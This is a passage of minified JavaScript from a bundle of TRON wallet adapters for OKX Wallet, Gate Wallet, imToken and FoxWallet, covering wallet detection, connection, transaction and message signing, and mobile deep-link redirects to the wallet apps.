                                throw new N(null == t ? void 0 : t.message,t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                connect() {
                    return Wn(this, void 0, void 0, function*() {
                        var t;
                        try {
                            if (this.checkIfOpenOkxWallet(),
                            this.connected || this.connecting)
                                return;
                            if (yield this._checkWallet(),
                            this.state === c.NotFound)
                                throw !1 !== this.config.openUrlWhenWalletNotFound && h() && window.open(this.url, "_blank"),
                                new p;
                            if (!this._wallet)
                                return;
                            this._connecting = !0;
                            const e = this._wallet;
                            try {
                                const t = yield e.request({
                                    method: "tron_requestAccounts"
                                });
                                if (!t)
                                    throw new w("Request connect error.");
                                if (4e3 === t.code)
                                    throw new w("The same DApp has already initiated a request to connect to OkxWallet, and the pop-up window has not been closed.");
                                if (4001 === t.code)
                                    throw new w("The user rejected connection.")
                            } catch (t) {
                                throw new w(null == t ? void 0 : t.message,t)
                            }
                            const n = (null === (t = e.tronWeb.defaultAddress) || void 0 === t ? void 0 : t.base58) || "";
                            this.setAddress(n),
                            this.setState(c.Connected),
                            this._listenEvent(),
                            this.connected && this.emit("connect", this.address || "")
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        } finally {
                            this._connecting = !1
                        }
                    })
                }
                disconnect() {
                    return Wn(this, void 0, void 0, function*() {
                        this._stopListenEvent(),
                        this.state === c.Connected && (this.setAddress(null),
                        this.setState(c.Disconnect),
                        this.emit("disconnect"))
                    })
                }
                signTransaction(t, e) {
                    return Wn(this, void 0, void 0, function*() {
                        try {
                            const n = yield this.checkAndGetWallet();
                            try {
                                return yield n.tronWeb.trx.sign(t, e)
                            } catch (t) {
                                throw t instanceof Error || "object" == typeof t && t.message ? new v(t.message,t) : "string" == typeof t ? new v(t,new Error(t)) : new v("Unknown error",t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                multiSign(t, e, n) {
                    return Wn(this, void 0, void 0, function*() {
                        try {
                            const r = yield this.checkAndGetWallet();
                            try {
                                return yield r.tronWeb.trx.multiSign(t, e, n)
                            } catch (t) {
                                throw t instanceof Error || "object" == typeof t && t.message ? new v(t.message,t) : "string" == typeof t ? new v(t,new Error(t)) : new v("Unknown error",t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                signMessage(t, e) {
                    return Wn(this, void 0, void 0, function*() {
                        try {
                            const n = yield this.checkAndGetWallet();
                            try {
                                return yield n.tronWeb.trx.signMessageV2(t, e)
                            } catch (t) {
                                throw t instanceof Error || "object" == typeof t && t.message ? new y(t.message,t) : "string" == typeof t ? new y(t,new Error(t)) : new y("Unknown error",t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                checkAndGetWallet() {
                    return Wn(this, void 0, void 0, function*() {
                        if (this.checkIfOpenOkxWallet(),
                        yield this._checkWallet(),
                        this.state !== c.Connected)
                            throw new g;
                        const t = this._wallet;
                        if (!t || !t.tronWeb)
                            throw new g;
                        return t
                    })
                }
                _listenEvent() {
                    this._stopListenEvent(),
                    window.addEventListener("message", this.messageHandler)
                }
                _stopListenEvent() {
                    window.removeEventListener("message", this.messageHandler)
                }
                checkIfOpenOkxWallet() {
                    if (!1 !== this.config.openAppWithDeeplink && !("undefined" != typeof window && void 0 !== window.navigator && /OKApp/i.test(window.navigator.userAgent) || !u() || (window.location.href = "okx://wallet/dapp/url?dappUrl=" + encodeURIComponent(window.location.href),
                    0)))
                        throw new p
                }
                _checkWallet() {
                    if (this.readyState === a.Found)
                        return Promise.resolve(!0);
                    if (this._checkPromise)
                        return this._checkPromise;
                    const t = Math.floor(this.config.checkTimeout / 100);
                    let e, n = 0;
                    return this._checkPromise = new Promise(r => {
                        const i = () => {
                            n++;
                            const i = Un();
                            (i || n > t) && (e && clearInterval(e),
                            this._readyState = i ? a.Found : a.NotFound,
                            this._updateWallet(),
                            this.emit("readyStateChanged", this.readyState),
                            r(i))
                        }
                        ;
                        e = setInterval(i, 100),
                        i()
                    }
                    ),
                    this._checkPromise
                }
                setAddress(t) {
                    this._address = t
                }
                setState(t) {
                    t !== this.state && (this._state = t,
                    this.emit("stateChanged", t))
                }
            }
            ,
            gate: new class extends d {
                constructor(t={}) {
                    super(),
                    this.name = "Gate Wallet",
                    this.url = "https://gate.io",
                    this.icon = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPG1hc2sgaWQ9Im1hc2swXzQ1ODJfNzgxIiBzdHlsZT0ibWFzay10eXBlOmFscGhhIiBtYXNrVW5pdHM9InVzZXJTcGFjZU9uVXNlIiB4PSIwIiB5PSIwIiB3aWR0aD0iNDAiIGhlaWdodD0iNDAiPgo8cGF0aCBkPSJNMCA4QzAgMy41ODE3MiAzLjU4MTcyIDAgOCAwSDMyQzM2LjQxODMgMCA0MCAzLjU4MTcyIDQwIDhWMzJDNDAgMzYuNDE4MyAzNi40MTgzIDQwIDMyIDQwSDhDMy41ODE3MiA0MCAwIDM2LjQxODMgMCAzMlY4WiIgZmlsbD0id2hpdGUiLz4KPC9tYXNrPgo8ZyBtYXNrPSJ1cmwoI21hc2swXzQ1ODJfNzgxKSI+CjxwYXRoIGQ9Ik0wIDhDMCAzLjU4MTcyIDMuNTgxNzIgMCA4IDBIMzJDMzYuNDE4MyAwIDQwIDMuNTgxNzIgNDAgOFYzMkM0MCAzNi40MTgzIDM2LjQxODMgNDAgMzIgNDBIOEMzLjU4MTcyIDQwIDAgMzYuNDE4MyAwIDMyVjhaIiBmaWxsPSIjMDA1MUQyIi8+CjwvZz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0zNSAyMEMzNSAyOC4yODQzIDI4LjI4NDMgMzUgMjAgMzVDMTEuNzE1NyAzNSA1IDI4LjI4NDMgNSAyMEM1IDExLjcxNTcgMTEuNzE1NyA1IDIwIDVWMTIuMDU4N0MyMCAxMi4wNTg3IDE5Ljk5OTkgMTIuMDU4NyAxOS45OTk5IDEyLjA1ODdDMTUuNjE0MSAxMi4wNTg3IDEyLjA1ODcgMTUuNjE0MSAxMi4wNTg3IDE5Ljk5OTlDMTIuMDU4NyAyNC4zODU3IDE1LjYxNDEgMjcuOTQxMSAxOS45OTk5IDI3Ljk0MTFDMjQuMzg1NiAyNy45NDExIDI3Ljk0MSAyNC4zODU3IDI3Ljk0MTEgMjBIMzVaIiBmaWxsPSJ3aGl0ZSIvPgo8cmVjdCB4PSIyMCIgeT0iMTIuMDU4NiIgd2lkdGg9IjcuOTQxMTgiIGhlaWdodD0iNy45NDExOCIgZmlsbD0iIzE0RTBBMSIvPgo8L3N2Zz4K",
                    this._readyState = h() ? a.Loading : a.NotFound,
                    this._state = c.Loading,
                    this.onGateAccountChange = t => {
                        setTimeout( () => {
                            const e = this.address || "";
                            if (0 !== t.length) {
                                const e = t[0];
                                this.setAddress(e),
                                this.setState(c.Connected)
                            } else
                                this.setAddress(null),
                                this.setState(c.Disconnect);
                            (this.address || "") !== e && this.emit("accountsChanged", this.address || "", e),
                            !e && this.address ? this.emit("connect", this.address) : e && !this.address && this.emit("disconnect")
                        }
                        , 200)
                    }
                    ,
                    this._checkPromise = null,
                    this._updateWallet = () => {
                        var t, e;
                        let n = this.state
                          , r = this.address;
                        Ln() ? (this._wallet = Sn ? window.gatewallet.tronLink : window.gatewallet.tron,
                        this._listenEvent(),
                        r = (null === (e = null === (t = this._wallet.tronWeb) || void 0 === t ? void 0 : t.defaultAddress) || void 0 === e ? void 0 : e.base58) || null,
                        n = (Sn ? this._wallet.ready : this._wallet.tronWeb.ready) ? c.Connected : c.Disconnect) : (this._wallet = null,
                        r = null,
                        n = c.NotFound),
                        this.setAddress(r),
                        this.setState(n)
                    }
                    ;
                    const {checkTimeout: e=2e3, openUrlWhenWalletNotFound: n=!0, openAppWithDeeplink: r=!0} = t;
                    if ("number" != typeof e)
                        throw new Error("[GateWalletAdapter] config.checkTimeout should be a number");
                    if (this.config = {
                        checkTimeout: e,
                        openAppWithDeeplink: r,
                        openUrlWhenWalletNotFound: n
                    },
                    this._connecting = !1,
                    this._wallet = null,
                    this._address = null,
                    !h())
                        return this._readyState = a.NotFound,
                        void this.setState(c.NotFound);
                    Ln() ? (this._readyState = a.Found,
                    this._updateWallet()) : this._checkWallet().then( () => {
                        this.connected && this.emit("connect", this.address || "")
                    }
                    )
                }
                get address() {
                    return this._address
                }
                get state() {
                    return this._state
                }
                get readyState() {
                    return this._readyState
                }
                get connecting() {
                    return this._connecting
                }
                network() {
                    return Cn(this, void 0, void 0, function*() {
                        try {
                            if (yield this._checkWallet(),
                            this.state !== c.Connected)
                                throw new g;
                            const t = this._wallet;
                            if (!t || !t.tronWeb)
                                throw new g;
                            try {
                                return yield In(t.tronWeb)
                            } catch (t) {
                                throw new N(null == t ? void 0 : t.message,t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                connect() {
                    return Cn(this, void 0, void 0, function*() {
                        var t;
                        try {
                            if (this.checkIfOpenGateWallet(),
                            this.connected || this.connecting)
                                return;
                            if (yield this._checkWallet(),
                            this.state === c.NotFound)
                                throw !1 !== this.config.openUrlWhenWalletNotFound && h() && window.open(this.url, "_blank"),
                                new p;
                            if (!this._wallet)
                                return;
                            this._connecting = !0;
                            const e = this._wallet;
                            let n;
                            try {
                                const t = Sn ? "tron_requestAccounts" : "eth_requestAccounts";
                                if (n = yield e.request({
                                    method: t
                                }),
                                !n)
                                    throw new w("Request connect error.");
                                if (4e3 === n.code)
                                    throw new w("The same DApp has already initiated a request to connect to GateWallet, and the pop-up window has not been closed.");
                                if (4001 === n.code)
                                    throw new w("The user rejected connection.")
                            } catch (t) {
                                throw new w(null == t ? void 0 : t.message,t)
                            }
                            const r = (Sn ? null === (t = e.tronWeb.defaultAddress) || void 0 === t ? void 0 : t.base58 : n[0]) || "";
                            this.setAddress(r),
                            this.setState(c.Connected),
                            this._listenEvent(),
                            this.connected && this.emit("connect", this.address || "")
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        } finally {
                            this._connecting = !1
                        }
                    })
                }
                disconnect() {
                    return Cn(this, void 0, void 0, function*() {
                        this._stopListenEvent(),
                        this.state === c.Connected && (this.setAddress(null),
                        this.setState(c.Disconnect),
                        this.emit("disconnect"))
                    })
                }
                signTransaction(t, e) {
                    return Cn(this, void 0, void 0, function*() {
                        try {
                            const n = yield this.checkAndGetWallet();
                            try {
                                return yield n.tronWeb.trx.sign(t, e)
                            } catch (t) {
                                throw t instanceof Error || "object" == typeof t && t.message ? new v(t.message,t) : "string" == typeof t ? new v(t,new Error(t)) : new v("Unknown error",t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                multiSign(t, e, n) {
                    return Cn(this, void 0, void 0, function*() {
                        try {
                            const r = yield this.checkAndGetWallet();
                            try {
                                return yield r.tronWeb.trx.multiSign(t, e, n)
                            } catch (t) {
                                throw t instanceof Error || "object" == typeof t && t.message ? new v(t.message,t) : "string" == typeof t ? new v(t,new Error(t)) : new v("Unknown error",t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                signMessage(t, e) {
                    return Cn(this, void 0, void 0, function*() {
                        try {
                            const n = yield this.checkAndGetWallet();
                            try {
                                return yield n.tronWeb.trx.signMessageV2(t, e)
                            } catch (t) {
                                throw t instanceof Error || "object" == typeof t && t.message ? new y(t.message,t) : "string" == typeof t ? new y(t,new Error(t)) : new y("Unknown error",t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                checkAndGetWallet() {
                    return Cn(this, void 0, void 0, function*() {
                        if (this.checkIfOpenGateWallet(),
                        yield this._checkWallet(),
                        this.state !== c.Connected)
                            throw new g;
                        const t = this._wallet;
                        if (!t || !t.tronWeb)
                            throw new g;
                        return t
                    })
                }
                _listenEvent() {
                    this._stopListenEvent(),
                    Sn || this._wallet.on("accountsChanged", this.onGateAccountChange)
                }
                _stopListenEvent() {
                    Sn || this._wallet.off("accountsChanged", this.onGateAccountChange)
                }
                checkIfOpenGateWallet() {
                    if (!1 !== this.config.openAppWithDeeplink && !("undefined" != typeof window && void 0 !== window.navigator && /GateApp/i.test(window.navigator.userAgent) || !u() || (window.location.href = "https://gateio.onelink.me/DmA6/web3?dapp_url=" + encodeURIComponent(window.location.href),
                    0)))
                        throw new p
                }
                _checkWallet() {
                    if (this.readyState === a.Found)
                        return Promise.resolve(!0);
                    if (this._checkPromise)
                        return this._checkPromise;
                    const t = Math.floor(this.config.checkTimeout / 100);
                    let e, n = 0;
                    return this._checkPromise = new Promise(r => {
                        const i = () => {
                            n++;
                            const i = Ln();
                            (i || n > t) && (e && clearInterval(e),
                            this._readyState = i ? a.Found : a.NotFound,
                            this._updateWallet(),
                            this.emit("readyStateChanged", this.readyState),
                            r(i))
                        }
                        ;
                        e = setInterval(i, 100),
                        i()
                    }
                    ),
                    this._checkPromise
                }
                setAddress(t) {
                    this._address = t
                }
                setState(t) {
                    t !== this.state && (this._state = t,
                    this.emit("stateChanged", t))
                }
            }
            ,
            imtoken: new class extends d {
                constructor(t={}) {
                    super(),
                    this.name = "imToken Wallet",
                    this.url = "https://token.im/",
                    this.icon = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTEzIiBoZWlnaHQ9IjUxMiIgdmlld0JveD0iMCAwIDUxMyA1MTIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxnIGNsaXAtcGF0aD0idXJsKCNjbGlwMF84OTNfMjU5OSkiPgo8bWFzayBpZD0ibWFzazBfODkzXzI1OTkiIHN0eWxlPSJtYXNrLXR5cGU6bHVtaW5hbmNlIiBtYXNrVW5pdHM9InVzZXJTcGFjZU9uVXNlIiB4PSIwIiB5PSIwIiB3aWR0aD0iNTEzIiBoZWlnaHQ9IjUxMiI+CjxwYXRoIGQ9Ik01MTIuMzE5IDBIMC4zMTkzMzZWNTEySDUxMi4zMTlWMFoiIGZpbGw9IndoaXRlIi8+CjwvbWFzaz4KPGcgbWFzaz0idXJsKCNtYXNrMF84OTNfMjU5OSkiPgo8cGF0aCBkPSJNMzk3Ljc0NiAwSDExNS43NDZDNTIuMjMzMyAwIDAuNzQ2MDk0IDUxLjQ4NzMgMC43NDYwOTQgMTE1VjM5N0MwLjc0NjA5NCA0NjAuNTEzIDUyLjIzMzMgNTEyIDExNS43NDYgNTEySDM5Ny43NDZDNDYxLjI1OSA1MTIgNTEyLjc0NiA0NjAuNTEzIDUxMi43NDYgMzk3VjExNUM1MTIuNzQ2IDUxLjQ4NzMgNDYxLjI1OSAwIDM5Ny43NDYgMFoiIGZpbGw9InVybCgjcGFpbnQwX2xpbmVhcl84OTNfMjU5OSkiLz4KPHBhdGggZD0iTTQxNy40MzYgMTU4LjI5MUM0MjguMDg0IDMwMi41MDcgMzM1LjM4MiAzNzAuNjcgMjUyLjI3NyAzNzcuOTM5QzE3NS4wMTQgMzg0LjY5NiAxMDIuMjg3IDMzNy4yMjEgOTUuOTA2NyAyNjQuMjc5QzkwLjY0MzYgMjA0LjAxNyAxMjcuODg5IDE3OC4zNjEgMTU3LjE1MiAxNzUuODA0QzE4Ny4yNDkgMTczLjE2NSAyMTIuNTQyIDE5My45MjEgMjE0LjczNiAyMTkuMDUyQzIxNi44NDkgMjQzLjIxMyAyMDEuNzczIDI1NC4yMTEgMTkxLjI4OCAyNTUuMTI2QzE4Mi45OTYgMjU1Ljg1MyAxNzIuNTY0IDI1MC44MTkgMTcxLjYyMiAyNDAuMDFDMTcwLjgxNCAyMzAuNzIyIDE3NC4zNDEgMjI5LjQ1NyAxNzMuNDc5IDIxOS41OUMxNzEuOTQ1IDIwMi4wMjQgMTU2LjYyNyAxOTkuOTc4IDE0OC4yNDEgMjAwLjcwNUMxMzguMDkyIDIwMS41OTQgMTE5LjY3OCAyMTMuNDM5IDEyMi4yNjIgMjQyLjk0NEMxMjQuODYgMjcyLjcwNSAxNTMuMzk2IDI5Ni4yMjEgMTkwLjgwMyAyOTIuOTVDMjMxLjE3MSAyODkuNDIzIDI1OS4yNzYgMjU3Ljk5MyAyNjEuMzkgMjEzLjkxQzI2MS4zNyAyMTEuNTc1IDI2MS44NjIgMjA5LjI2NCAyNjIuODMgMjA3LjEzOUwyNjIuODQzIDIwNy4wODZDMjYzLjI3OCAyMDYuMTYyIDI2My43ODcgMjA1LjI3NSAyNjQuMzY0IDIwNC40MzRDMjY1LjIyNiAyMDMuMTQyIDI2Ni4zMyAyMDEuNzE1IDI2Ny43NTYgMjAwLjE1M0MyNjcuNzcgMjAwLjExMyAyNjcuNzcgMjAwLjExMyAyNjcuNzk3IDIwMC4xMTNDMjY4LjgzMyAxOTguOTQyIDI3MC4wODUgMTk3LjY3NyAyNzEuNDk4IDE5Ni4zMTdDMjg5LjEzMiAxNzkuNjggMzUyLjYzOCAxNDAuNDQzIDQxMi42OTggMTUyLjg2N0M0MTMuOTY4IDE1My4xMzkgNDE1LjExNSAxNTMuODE0IDQxNS45NjkgMTU0Ljc5MkM0MTYuODIzIDE1NS43NyA0MTcuMzM3IDE1Ni45OTcgNDE3LjQzNiAxNTguMjkxWiIgZmlsbD0id2hpdGUiLz4KPC9nPgo8L2c+CjxkZWZzPgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50MF9saW5lYXJfODkzXzI1OTkiIHgxPSI1MTIuNDQiIHkxPSI4Ni41MTkiIHgyPSIxOC4wMjE5IiB5Mj0iMjc5LjUwMiIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPgo8c3RvcCBzdG9wLWNvbG9yPSIjMENDNUZGIi8+CjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iIzAwN0ZGRiIvPgo8L2xpbmVhckdyYWRpZW50Pgo8Y2xpcFBhdGggaWQ9ImNsaXAwXzg5M18yNTk5Ij4KPHJlY3Qgd2lkdGg9IjUxMyIgaGVpZ2h0PSI1MTIiIGZpbGw9IndoaXRlIi8+CjwvY2xpcFBhdGg+CjwvZGVmcz4KPC9zdmc+Cg==",
                    this._readyState = a.Loading,
                    this._state = c.Loading,
                    this.checkReadyInterval = null,
                    this._checkPromise = null,
                    this._updateWallet = () => kn(this, void 0, void 0, function*() {
                        var t, e;
                        let n = this.state
                          , r = this.address;
                        Dn() ? (this._wallet = {
                            ready: (null === (t = window.tronWeb) || void 0 === t ? void 0 : t.ready) || !1,
                            tronWeb: window.tronWeb,
                            request: () => Promise.resolve(null)
                        },
                        r = (null === (e = this._wallet.tronWeb.defaultAddress) || void 0 === e ? void 0 : e.base58) || null,
                        n = this._wallet.ready ? c.Connected : c.Disconnect,
                        this._wallet.ready || this.checkForWalletReady()) : (this._wallet = null,
                        r = null,
                        n = c.NotFound),
                        this.setAddress(r),
                        this.setState(n)
                    });
                    const {checkTimeout: e=2e3, openUrlWhenWalletNotFound: n=!0, openAppWithDeeplink: r=!0} = t;
                    if ("number" != typeof e)
                        throw new Error("[ImTokenAdapter] config.checkTimeout should be a number");
                    if (this.config = {
                        checkTimeout: e,
                        openUrlWhenWalletNotFound: n,
                        openAppWithDeeplink: r
                    },
                    this._connecting = !1,
                    this._wallet = null,
                    this._address = null,
                    !h())
                        return this._readyState = a.NotFound,
                        void this.setState(c.NotFound);
                    Dn() ? (this._readyState = a.Found,
                    this._updateWallet()) : this._checkWallet().then( () => {
                        this.connected && this.emit("connect", this.address || "")
                    }
                    )
                }
                get address() {
                    return this._address
                }
                get state() {
                    return this._state
                }
                get readyState() {
                    return this._readyState
                }
                get connecting() {
                    return this._connecting
                }
                network() {
                    return kn(this, void 0, void 0, function*() {
                        try {
                            if (yield this._checkWallet(),
                            this.state !== c.Connected)
                                throw new g;
                            const t = this._wallet;
                            if (!t || !t.tronWeb)
                                throw new g;
                            try {
                                return yield In(t.tronWeb)
                            } catch (t) {
                                throw new N(null == t ? void 0 : t.message,t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                connect() {
                    return kn(this, void 0, void 0, function*() {
                        var t;
                        try {
                            if (this.checkIfOpenApp(),
                            this.connected || this.connecting)
                                return;
                            if (yield this._checkWallet(),
                            this.readyState === a.NotFound)
                                throw !1 !== this.config.openUrlWhenWalletNotFound && h() && window.open(this.url, "_blank"),
                                new p;
                            const e = (null === (t = this._wallet.tronWeb.defaultAddress) || void 0 === t ? void 0 : t.base58) || "";
                            this.setAddress(e),
                            this.setState(c.Connected),
                            this.emit("connect", this.address || "")
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        } finally {
                            this._connecting = !1
                        }
                    })
                }
                disconnect() {
                    return kn(this, void 0, void 0, function*() {
                        this.state === c.Connected && (this.setAddress(null),
                        this.setState(c.Disconnect),
                        this.emit("disconnect"))
                    })
                }
                signTransaction(t, e) {
                    return kn(this, void 0, void 0, function*() {
                        try {
                            const n = yield this.checkAndGetWallet();
                            try {
                                return yield n.tronWeb.trx.sign(t, e)
                            } catch (t) {
                                throw t instanceof Error || "object" == typeof t && t.message ? new v(t.message,t) : "string" == typeof t ? new v(t,new Error(t)) : new v("Unknown error",t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                multiSign(t, e, n) {
                    return kn(this, void 0, void 0, function*() {
                        try {
                            const r = yield this.checkAndGetWallet();
                            try {
                                return yield r.tronWeb.trx.multiSign(t, e, n)
                            } catch (t) {
                                throw t instanceof Error || "object" == typeof t && t.message ? new v(t.message,t) : "string" == typeof t ? new v(t,new Error(t)) : new v("Unknown error",t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                signMessage(t, e) {
                    return kn(this, void 0, void 0, function*() {
                        try {
                            const n = yield this.checkAndGetWallet();
                            try {
                                return yield n.tronWeb.trx.signMessageV2(t, e)
                            } catch (t) {
                                throw t instanceof Error || "object" == typeof t && t.message ? new y(t.message,t) : "string" == typeof t ? new y(t,new Error(t)) : new y("Unknown error",t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                checkAndGetWallet() {
                    return kn(this, void 0, void 0, function*() {
                        if (this.checkIfOpenApp(),
                        yield this._checkWallet(),
                        !this.connected)
                            throw new g;
                        const t = this._wallet;
                        if (!t || !t.tronWeb)
                            throw new g;
                        return t
                    })
                }
                checkForWalletReady() {
                    if (this.checkReadyInterval)
                        return;
                    let t = 0;
                    const e = Math.floor(this.config.checkTimeout / 200);
                    this.checkReadyInterval = setInterval( () => kn(this, void 0, void 0, function*() {
                        this._wallet && this._wallet.ready ? (this.checkReadyInterval && clearInterval(this.checkReadyInterval),
                        this.checkReadyInterval = null,
                        yield this._updateWallet(),
                        this.emit("connect", this.address || "")) : t > e ? (this.checkReadyInterval && clearInterval(this.checkReadyInterval),
                        this.checkReadyInterval = null) : t++
                    }), 200)
                }
                _checkWallet() {
                    if (this.readyState === a.Found)
                        return Promise.resolve(!0);
                    if (this._checkPromise)
                        return this._checkPromise;
                    const t = Math.floor(this.config.checkTimeout / 100);
                    let e, n = 0;
                    return this._checkPromise = new Promise(r => {
                        const i = () => {
                            n++;
                            const i = Dn();
                            (i || n > t) && (e && clearInterval(e),
                            this._readyState = i ? a.Found : a.NotFound,
                            this._updateWallet(),
                            this.emit("readyStateChanged", this.readyState),
                            r(i))
                        }
                        ;
                        e = setInterval(i, 100),
                        i()
                    }
                    ),
                    this._checkPromise
                }
                checkIfOpenApp() {
                    if (!1 !== this.config.openAppWithDeeplink && function() {
                        if (u() && !Dn()) {
                            const {origin: t, pathname: e, search: n, hash: r} = window.location
                              , i = t + e + n + r;
                            return location.href = `imtokenv2://navigate/DappView?url=${encodeURIComponent(i)}`,
                            !0
                        }
                        return !1
                    }())
                        throw new p
                }
                setAddress(t) {
                    this._address = t
                }
                setState(t) {
                    t !== this.state && (this._state = t,
                    this.emit("stateChanged", t))
                }
            }
            ,
            fox: new class extends d {
                constructor(t={}) {
                    super(),
                    this.name = "FoxWallet",
                    this.url = "https://foxwallet.com/",
                    this.icon = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTQxIiBoZWlnaHQ9IjE0MCIgdmlld0JveD0iMCAwIDE0MSAxNDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHg9IjAuNSIgd2lkdGg9IjE0MCIgaGVpZ2h0PSIxNDAiIHJ4PSI0IiBmaWxsPSJibGFjayIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTkwLjI5NDQgMzMuNTk2NUM4NC40OTMxIDMwLjUyNTMgODAuMDg5MyAyNS4xMzAyIDc4LjM1MDYgMTguNjQ2NUM3Ny44MTQzIDIwLjYyOSA3Ny41MzgxIDIyLjcwOSA3Ny41MzgxIDI0Ljg1NEM3Ny41MzgxIDI2LjUyNzcgNzcuNzE2OCAyOC4xNTI3IDc4LjA0MTggMjkuNzI5Qzc4LjA0MTggMjkuNzI5IDc4LjA0MTggMjkuNzI5IDc4LjA0MTggMjkuNzQ1M0M3OC4wNDE4IDI5Ljc2MTUgNzguMDU4MSAyOS43OTQgNzguMDU4MSAyOS44MTAzQzc4LjQ5NjggMzEuOTIyOCA3OS4yMTE4IDMzLjkyMTUgODAuMTcwNiAzNS43NzRDNzguMTIzMSAzNC4yNjI4IDc2LjMwMzEgMzIuNDU5IDc0Ljc3NTYgMzAuNDI3OEM3Mi43MjgxIDQ2LjMwNCA3OC40OTY4IDYyLjgzMDMgODkuMDQzMSA3My43MTc4QzEwMi44MDcgODkuNzQwMyA5MC4xMTU2IDExNi45MjcgNjguNjY1NiAxMTYuMjEyQzM4LjMxMDUgMTE2LjQ3MiAzMy4xMTA1IDcxLjc2NzggNjIuMjMwNiA2NC43NDc4TDYyLjIxNDMgNjQuNjY2NkM2OS45ODE4IDYyLjE0NzggNzMuNjIxOCA1Ny4wOTQgNzQuMjU1NiA1MC41MjlDNjMuMDQzMSA1OS42MTI4IDQ1LjMzMDUgNDguMzUxNSA0OS4wMDMxIDM0LjI0NjVDNi45MTU1IDU0Ljk2NTMgMjIuNTQ4IDEyMi4xNzUgNzAuMjU4MSAxMjEuMzQ3QzkxLjA0MTkgMTIxLjM0NyAxMDguNjI0IDEwNy41OTkgMTE0LjM5MyA4OC43MDAzQzEyMS4yODMgNjYuNjY1MyAxMTAuMTM2IDQzLjE4NCA5MC4yOTQ0IDMzLjU5NjVaIiBmaWxsPSIjMTJGRTc0Ii8+Cjwvc3ZnPgo=",
                    this._readyState = a.Loading,
                    this._state = c.Loading,
                    this.checkReadyInterval = null,
                    this._checkPromise = null,
                    this._updateWallet = () => {
                        var t, e;
                        let n = this.state
                          , r = this.address;
                        bn() ? (this._wallet = window.foxwallet.tronLink,
                        r = (null === (e = null === (t = this._wallet.tronWeb) || void 0 === t ? void 0 : t.defaultAddress) || void 0 === e ? void 0 : e.base58) || null,
                        n = r ? c.Connected : c.Disconnect) : (this._wallet = null,
                        r = null,
                        n = c.NotFound),
                        u() && n === c.Disconnect && this.checkForWalletReady(),
                        this.setAddress(r),
                        this.setState(n)
                    }
                    ;
                    const {checkTimeout: e=2e3, openUrlWhenWalletNotFound: n=!0, openAppWithDeeplink: r=!0} = t;
                    if ("number" != typeof e)
                        throw new Error("[FoxWalletAdapter] config.checkTimeout should be a number");
                    if (this.config = {
                        checkTimeout: e,
                        openUrlWhenWalletNotFound: n,
                        openAppWithDeeplink: r
                    },
                    this._connecting = !1,
                    this._wallet = null,
                    this._address = null,
                    !u())
                        return this._readyState = a.NotFound,
                        void this.setState(c.NotFound);
                    bn() ? (this._readyState = a.Found,
                    this._updateWallet()) : this._checkWallet().then( () => {
                        this.connected && this.emit("connect", this.address || "")
                    }
                    )
                }
                get address() {
                    return this._address
                }
                get state() {
                    return this._state
                }
                get readyState() {
                    return this._readyState
                }
                get connecting() {
                    return this._connecting
                }
                network() {
                    return _n(this, void 0, void 0, function*() {
                        try {
                            if (yield this._checkWallet(),
                            this.state !== c.Connected)
                                throw new g;
                            const t = this._wallet;
                            if (!t || !t.tronWeb)
                                throw new g;
                            try {
                                return yield In(t.tronWeb)
                            } catch (t) {
                                throw new N(null == t ? void 0 : t.message,t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                connect() {
                    return _n(this, void 0, void 0, function*() {
                        var t;
                        try {
                            if (this.checkIfOpenApp(),
                            this.connected || this.connecting)
                                return;
                            if (yield this._checkWallet(),
                            this.readyState === a.NotFound)
                                throw !1 !== this.config.openUrlWhenWalletNotFound && h() && window.open(this.url, "_blank"),
                                new p;
                            if (!this._wallet)
                                return;
                            this._connecting = !0;
                            const e = this._wallet;
                            try {
                                const t = yield e.request({
                                    method: "tron_requestAccounts"
                                });
                                if (!t)
                                    throw new w("Request connect error.");
                                if (4e3 === t.code)
                                    throw new w("The same DApp has already initiated a request to connect to FoxWallet, and the pop-up window has not been closed.");
                                if (4001 === t.code)
                                    throw new w("The user rejected connection.")
                            } catch (t) {
                                throw new w(null == t ? void 0 : t.message,t)
                            }
                            const n = (null === (t = e.tronWeb.defaultAddress) || void 0 === t ? void 0 : t.base58) || "";
                            this.setAddress(n),
                            this.setState(c.Connected),
                            this.emit("connect", this.address || "")
                        } catch (t) {
